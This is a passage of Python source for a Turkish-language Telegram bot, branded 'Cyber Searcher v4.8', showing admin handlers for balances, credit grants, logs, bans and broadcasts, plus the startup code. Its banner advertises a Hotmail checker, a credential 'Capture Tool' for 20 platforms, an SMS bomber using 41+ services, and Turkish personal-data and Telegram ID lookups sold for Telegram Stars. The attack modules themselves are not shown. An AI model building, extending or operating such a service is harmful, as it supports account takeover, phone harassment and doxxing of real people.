                bot_instance.send_message(cid, txt[:4000], parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "tgid_give":
            m = bot_instance.send_message(cid, "🆔 <b>TG-ID Bakiye Ver</b>\n<code>USER_ID MIKTAR</code>", parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _admin_tgid_give(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "tgid_take":
            m = bot_instance.send_message(cid, "➖ <b>TG-ID Bakiye Al</b>\n<code>USER_ID MIKTAR</code>", parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _admin_tgid_take(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "tgid_logs":
            conn = sqlite3.connect(DB_PATH); c = conn.cursor()
            c.execute("SELECT user_id, username, target, status, date FROM tgid_logs ORDER BY id DESC LIMIT 20")
            logs = c.fetchall(); conn.close()
            if not logs: bot_instance.send_message(cid, "📭 Yok.", parse_mode="HTML")
            else:
                txt = "📋 <b>TG-ID LOG</b>\n"
                for ui, un, tgt, st, dt in logs:
                    ico = "✅" if st == "OK" else "❌"
                    txt += f"{ico} @{esc(tgt)} @{esc(un or ui)} {dt[5:16]}\n"
                bot_instance.send_message(cid, txt[:4000], parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "tgid_purchases":
            conn = sqlite3.connect(DB_PATH); c = conn.cursor()
            c.execute("SELECT user_id, username, package, queries, stars FROM tgid_purchases ORDER BY id DESC LIMIT 20")
            logs = c.fetchall(); conn.close()
            if not logs: bot_instance.send_message(cid, "📭 Yok.", parse_mode="HTML")
            else:
                txt = "💰 <b>TG-ID ALIM</b>\n"
                for ui, un, pkg, q, s2 in logs: txt += f"👤 @{esc(un or ui)} | {pkg} | +{q} | {s2}⭐\n"
                bot_instance.send_message(cid, txt[:4000], parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "aiimg_give":
            m = bot_instance.send_message(cid, "🎨 <b>AI Hak Ver</b>\n<code>USER_ID MIKTAR</code>", parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _admin_aiimg_give(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "aiimg_take":
            m = bot_instance.send_message(cid, "➖ <b>AI Hak Al</b>\n<code>USER_ID MIKTAR</code>", parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _admin_aiimg_take(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "aiimg_logs":
            conn = sqlite3.connect(DB_PATH); c = conn.cursor()
            c.execute("SELECT user_id, username, prompt, status, date FROM aiimg_logs ORDER BY id DESC LIMIT 20")
            logs = c.fetchall(); conn.close()
            if not logs: bot_instance.send_message(cid, "📭 Yok.", parse_mode="HTML")
            else:
                txt = "📋 <b>AI LOG</b>\n"
                for ui, un, pr, st, dt in logs:
                    ico = "✅" if st == "OK" else "❌"
                    txt += f"{ico} @{esc(un or ui)} {esc((pr or '')[:30])}\n"
                bot_instance.send_message(cid, txt[:4000], parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "aiimg_purchases":
            conn = sqlite3.connect(DB_PATH); c = conn.cursor()
            c.execute("SELECT user_id, username, package, credits, stars FROM aiimg_purchases ORDER BY id DESC LIMIT 20")
            logs = c.fetchall(); conn.close()
            if not logs: bot_instance.send_message(cid, "📭 Yok.", parse_mode="HTML")
            else:
                txt = "💰 <b>AI ALIM</b>\n"
                for ui, un, pkg, q, s2 in logs: txt += f"👤 @{esc(un or ui)} | {pkg} | +{q} | {s2}⭐\n"
                bot_instance.send_message(cid, txt[:4000], parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
    except Exception as e:
        print(f"[ADMIN CB ERROR] {e}")
        try: bot_instance.answer_callback_query(call.id, "⚠️ Hata!", show_alert=True)
        except: pass

def _admin_remove(msg, bot_instance):
    tid, tun = _resolve_target(msg.text.strip())
    if not tid:
        bot_instance.reply_to(msg, "❌ Bulunamadı!", parse_mode="HTML"); return
    rem = []
    if is_premium(tid): remove_premium(tid); rem.append("Hotmail")
    if is_premium_osint(tid): remove_premium_osint(tid); rem.append("OSINT")
    if rem: bot_instance.reply_to(msg, f"✅ @{esc(tun or tid)} {', '.join(rem)} kaldırıldı!", parse_mode="HTML")
    else: bot_instance.reply_to(msg, f"ℹ️ Zaten yok.", parse_mode="HTML")

def _admin_ban(msg, bot_instance):
    tid, tun = _resolve_target(msg.text.strip())
    if not tid:
        bot_instance.reply_to(msg, "❌ Bulunamadı!", parse_mode="HTML"); return
    m = bot_instance.reply_to(msg, f"🚫 @{esc(tun or tid)} - Sebep gir:", parse_mode="HTML")
    bot_instance.register_next_step_handler(m, lambda m: _admin_ban_reason(m, bot_instance, tid, tun))

def _admin_ban_reason(msg, bot_instance, tid, tun):
    reason = msg.text.strip() or "Kural ihlali"
    ban_user(tid, reason)
    bot_instance.reply_to(msg, f"🚫 @{esc(tun or tid)} yasaklandı!", parse_mode="HTML")
    try: bot_instance.send_message(tid, f"🚫 <b>YASAKLANDINIZ!</b>\nSebep: {esc(reason)}", parse_mode="HTML")
    except: pass

def _admin_unban(msg, bot_instance):
    tid, tun = _resolve_target(msg.text.strip())
    if not tid:
        bot_instance.reply_to(msg, "❌ Bulunamadı!", parse_mode="HTML"); return
    unban_user(tid)
    bot_instance.reply_to(msg, f"✅ @{esc(tun or tid)} banı kaldırıldı!", parse_mode="HTML")

def _admin_announce(msg, bot_instance):
    ann = msg.text.strip()
    if not ann:
        bot_instance.reply_to(msg, "❌ Boş!", parse_mode="HTML"); return
    users = get_all_users()
    if not users:
        bot_instance.reply_to(msg, "❌ Kullanıcı yok.", parse_mode="HTML"); return
    sent = 0; failed = 0
    for ui, un, fn, bn in users:
        if bn: continue
        try:
            bot_instance.send_message(ui, f"📢 <b>DUYURU</b>\n{esc(ann)}", parse_mode="HTML")
            sent += 1; time.sleep(0.1)
        except: failed += 1
    bot_instance.reply_to(msg, f"✅ {sent} ✅ / ❌ {failed}", parse_mode="HTML")

def _admin_tgid_give(msg, bot_instance):
    if msg.from_user.id != ADMIN_ID: return
    try:
        p = msg.text.strip().split(); tid = int(p[0]); amt = int(p[1])
        if amt <= 0: raise ValueError
    except:
        bot_instance.reply_to(msg, "❌ Geçersiz! Örnek: <code>123456789 50</code>", parse_mode="HTML"); return
    add_user(tid, "", ""); tgid_init_user(tid); tgid_add_balance(tid, amt)
    bot_instance.reply_to(msg, f"✅ <b>Verildi!</b>\n🆔 {tid}\n➕ +{amt}\n💰 {tgid_get_balance(tid)}", parse_mode="HTML")
    try: bot_instance.send_message(tid, f"🎁 <b>Admin TG-ID bakiye verdi!</b>\n➕ +{amt}\n💰 {tgid_get_balance(tid)}", parse_mode="HTML")
    except: pass

def _admin_tgid_take(msg, bot_instance):
    if msg.from_user.id != ADMIN_ID: return
    try:
        p = msg.text.strip().split(); tid = int(p[0]); amt = int(p[1])
        if amt <= 0: raise ValueError
    except:
        bot_instance.reply_to(msg, "❌ Geçersiz!", parse_mode="HTML"); return
    nb = max(0, tgid_get_balance(tid) - amt)
    tgid_set(tid, "query_balance", nb)
    bot_instance.reply_to(msg, f"✅ Alındı!\n🆔 {tid}\n➖ -{amt}\n💰 {nb}", parse_mode="HTML")

def _admin_aiimg_give(msg, bot_instance):
    if msg.from_user.id != ADMIN_ID: return
    try:
        p = msg.text.strip().split(); tid = int(p[0]); amt = int(p[1])
        if amt <= 0: raise ValueError
    except:
        bot_instance.reply_to(msg, "❌ Geçersiz!", parse_mode="HTML"); return
    add_user(tid, "", ""); aiimg_init_user(tid); aiimg_add_credits(tid, amt)
    bot_instance.reply_to(msg, f"✅ <b>AI Hakkı Verildi!</b>\n🆔 {tid}\n➕ +{amt}\n💎 {aiimg_get_credits(tid)}", parse_mode="HTML")
    try: bot_instance.send_message(tid, f"🎁 <b>Admin AI hakkı verdi!</b>\n➕ +{amt}\n💎 {aiimg_get_credits(tid)}", parse_mode="HTML")
    except: pass

def _admin_aiimg_take(msg, bot_instance):
    if msg.from_user.id != ADMIN_ID: return
    try:
        p = msg.text.strip().split(); tid = int(p[0]); amt = int(p[1])
        if amt <= 0: raise ValueError
    except:
        bot_instance.reply_to(msg, "❌ Geçersiz!", parse_mode="HTML"); return
    nv = max(0, aiimg_get_credits(tid) - amt)
    aiimg_set(tid, "credit_balance", nv)
    bot_instance.reply_to(msg, f"✅ Alındı!\n🆔 {tid}\n➖ -{amt}\n💎 {nv}", parse_mode="HTML")

# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════
if __name__ == "__main__":
    child_mode = False; child_token = None
    argv = sys.argv[1:]
    for i, arg in enumerate(argv):
        if arg == "--bot" and i + 1 < len(argv):
            child_mode = True; child_token = argv[i + 1]
    if child_mode and child_token:
        print(f"[CHILD] {child_token[:10]}...")
        child_bot = telebot.TeleBot(child_token)
        register_handlers(child_bot)
        print(f"[CHILD] Ready!")
        try: child_bot.infinity_polling(timeout=60)
        except Exception as e: print(f"[CHILD] {e}")
        sys.exit(0)
    main_bot = telebot.TeleBot(BOT_TOKEN)
    register_handlers(main_bot)
    print("[MAIN] Starting saved bots...")
    start_saved_bots()
    print("""
╔══════════════════════════════════════════════════════╗
║       CYBER SEARCHER v4.8 — PRODUCTION               ║
║         Developer: @hackledin                        ║
╠══════════════════════════════════════════════════════╣
║  ✅ YouTube POT • Müzik • Video İndirici             ║
║  ✅ Türkiye Sorguları (12+ sorgu)                    ║
║  ✅ Hotmail Checker • Capture Tool (20 platform)    ║
║  ✅ SMS Bomber (41+ servis)                          ║
║  ✅ EXIF Metadata                                    ║
║  ✅ Telegram ID Sorgu                                ║
║  ✅ AI Image Generator (405 Fix!) 🎨                 ║
║  ✅ Parse Mode Fix                                   ║
╚══════════════════════════════════════════════════════╝
""")
    while True:
        try: main_bot.polling(non_stop=True, timeout=60)
        except Exception as e:
            print(f"[HATA] {e}"); time.sleep(5)
